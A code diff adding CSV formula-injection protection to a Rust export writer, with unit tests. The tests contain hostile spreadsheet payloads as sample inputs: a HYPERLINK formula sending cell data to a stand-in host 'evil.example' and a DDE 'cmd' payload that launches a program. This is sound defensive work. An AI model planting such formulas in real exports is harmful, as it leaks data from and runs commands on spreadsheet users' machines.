@@ -7,6 +7,8 @@
 //! number text and key order. One difference: integers beyond 2^53 are written exactly (the page rounded them).
 //! A shared fixture (`src/core/__fixtures__/export/rows.json`) holds the expected text for both sides.
 
+use std::borrow::Cow;
+
 use async_trait::async_trait;
 use serde::{Deserialize, Serialize};
 
@@ -185,15 +187,51 @@ impl Writer {
         }
     }
 
-    /// RFC 4180 field: quoted when it holds the separator, a quote or a line break; NULL is empty.
+    /// RFC 4180 field: quoted when it holds the separator, a quote or a line break, or was neutralised; NULL is empty.
     fn field(&self, text: Option<&str>) -> String {
         let Some(text) = text else { return String::new() };
-        if text.contains(self.separator.as_str()) || text.contains(['"', '\r', '\n']) {
-            format!("\"{}\"", text.replace('"', "\"\""))
+        let safe = neutralise_formula(text);
+        if matches!(safe, Cow::Owned(_)) || safe.contains(self.separator.as_str()) || safe.contains(['"', '\r', '\n']) {
+            format!("\"{}\"", safe.replace('"', "\"\""))
         } else {
-            text.to_owned()
+            safe.into_owned()
         }
     }
+}
+
+/// Spreadsheets (Excel, LibreOffice, Numbers) run a cell that starts with one of these as a formula: OWASP "CSV injection".
+const FORMULA_START: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];
+
+/// `neutraliseFormula`: a cell that a spreadsheet would evaluate gets a leading single quote, which spreadsheets take
+/// as "text follows"; a plain number such as `-5` is kept as it is so the sheet still reads a number.
+fn neutralise_formula(text: &str) -> Cow<'_, str> {
+    if text.starts_with(FORMULA_START) && !is_plain_number(text) {
+        Cow::Owned(format!("'{text}"))
+    } else {
+        Cow::Borrowed(text)
+    }
+}
+
+/// `-?[0-9]+(\.[0-9]+)?([eE][+-]?[0-9]+)?`, as the page's `PLAIN_NUMBER` matches.
+fn is_plain_number(text: &str) -> bool {
+    fn digits(text: &str) -> Option<&str> {
+        let end = text.find(|c: char| !c.is_ascii_digit()).unwrap_or(text.len());
+        (end > 0).then(|| &text[end..])
+    }
+    let Some(mut rest) = digits(text.strip_prefix('-').unwrap_or(text)) else {
+        return false;
+    };
+    if let Some(after) = rest.strip_prefix('.') {
+        let Some(after) = digits(after) else { return false };
+        rest = after;
+    }
+    if let Some(after) = rest.strip_prefix(['e', 'E']) {
+        let Some(after) = digits(after.strip_prefix(['+', '-']).unwrap_or(after)) else {
+            return false;
+        };
+        rest = after;
+    }
+    rest.is_empty()
 }
 
 /// `displayValue`: the text of a grid cell; `None` for NULL.
@@ -553,5 +591,30 @@ mod tests {
             .write(&mut out, None);
         assert_eq!(out, r#"{"1":3,"2":2,"b":4,"a":[1,{}]}"#);
         assert!(parse_json("01").is_none() && parse_json("{\"a\":}").is_none() && parse_json("[1,]").is_none());
+    }
+
+    #[test]
+    fn cells_a_spreadsheet_would_evaluate_are_neutralised() {
+        let writer = Writer::new(ExportFormat::Csv, None);
+        let field = |text: &str| writer.field(Some(text));
+        assert_eq!(
+            field(r#"=HYPERLINK("http://evil.example/?"&A1,"x")"#),
+            r#""'=HYPERLINK(""http://evil.example/?""&A1,""x"")""#
+        );
+        assert_eq!(field("-2+3+cmd|' /C calc'!A0"), "\"'-2+3+cmd|' /C calc'!A0\"");
+        assert_eq!(field("+1"), "\"'+1\"");
+        assert_eq!(field("@SUM(A1)"), "\"'@SUM(A1)\"");
+        assert_eq!(field("\tx"), "\"'\tx\"");
+        assert_eq!(field("\rx"), "\"'\rx\"");
+        assert_eq!(field("-Infinity"), "\"'-Infinity\"");
+        // Plain numbers, negative ones too, are left alone so the sheet still reads a number.
+        for number in ["-5", "-1.5e-7", "-0.000100", "-1E+3", "-1e5", "0", "12.50"] {
+            assert_eq!(field(number), number);
+        }
+        for not_number in ["-", "-.5", "-5.", "-1e", "-1e+", "-5 ", "- 5", "--5", "-5-"] {
+            assert!(!is_plain_number(not_number), "{not_number:?}");
+        }
+        let excel = Writer::new(ExportFormat::Excel, Some(";"));
+        assert_eq!(excel.field(Some("=1;2")), "\"'=1;2\"");
     }
 }
